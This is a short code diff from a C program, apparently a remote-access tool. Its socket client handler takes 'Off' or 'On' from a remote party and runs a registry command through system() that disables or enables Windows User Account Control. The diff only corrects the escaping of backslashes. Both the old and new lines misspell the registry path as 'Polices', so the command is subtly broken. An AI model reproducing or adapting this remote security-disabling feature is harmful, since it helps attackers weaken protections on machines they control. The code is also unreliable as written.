@@ -205,9 +205,9 @@ void handle_clients(socket,address)
 			send(*socket,"Turn (Off/On)? ",15,0);
 			get_cmd(socket,cmd,sizeof(cmd));
 			if(stricmp(cmd,"Off") == 0) {
-				system("%windir%\System32\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0 /f\"");
+				system("%windir%\\System32\\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0 /f\"");
 			} else if(stricmp(cmd,"On") == 0) {
-				system("%windir%\System32\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 1 /f\"");
+				system("%windir%\\System32\\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 1 /f\"");
 			} else {
 				sprintf(msg,"Invalid entry.\r\n");
 				send(*socket,msg,strlen(msg),0);
